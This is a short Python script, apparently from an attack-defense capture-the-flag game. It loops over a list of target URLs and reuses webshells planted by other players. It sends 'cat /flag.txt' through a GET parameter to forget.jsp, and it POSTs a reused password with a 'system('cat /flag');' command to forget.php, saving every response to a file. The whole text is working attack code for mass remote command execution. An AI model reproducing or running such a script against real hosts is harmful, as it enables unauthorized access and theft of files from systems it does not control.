from requests.exceptions import ReadTimeout
import requests

# 创建一个空列表，用于存储文件中的每一行
iplist = []

# 打开文件
with open('ip.txt', 'r', encoding='utf-8') as file:
    # 逐行读取
    line = file.readline()
    # 循环直到文件末尾
    while line:
        # 将读取的行添加到列表中，移除行尾的换行符
        iplist.append(line.strip())
        # 读取下一行
        line = file.readline()


def get(iplist):
    for i in range(0, len(iplist)):
        try:
            url = iplist[i]
            url = url + 'forget.jsp?cmd1=cat%20/flag.txt'  # 别人的攻击流量

            print(url)
            a = requests.get(url=url, timeout=3)
            print(a.text)
            with open("flag_别人的马.txt", 'a', encoding='UTF-8') as f:
                f.write(f"{a.text}")
        except:
            pass


def post(iplist):
    payload = {
        "passwd": "zzyInvincible",  #用别人的
        "cmd": "system('cat /flag');",
    }
    for i in range(0, len(iplist)):
        try:
            url = iplist[i]
            url = url + 'forget.php'  # 别人的攻击流量
            r = requests.post(url=url, data=payload, timeout=3)

            print(r.text)
            with open("flag_别人的马.txt", 'a', encoding='UTF-8') as f:
                f.write(f"{r.text}")
        except:
            pass


get(iplist)

##get传不死码
post(iplist)
